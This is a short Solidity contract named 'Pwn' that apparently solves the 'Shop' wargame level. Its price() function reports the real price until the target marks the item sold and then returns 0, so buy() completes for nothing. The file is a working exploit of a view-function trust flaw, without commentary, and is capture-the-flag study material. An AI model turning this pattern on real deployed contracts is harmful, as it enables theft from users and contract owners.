// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Pwn {

    Shop private immutable target;
    
    constructor(address _target) {
        target = Shop(_target);
    }

    function pwn() external {
        target.buy();
    }

    function price() external view returns (uint) {
        if (!target.isSold()) {
            return target.price();
        }
        return 0;
    }
}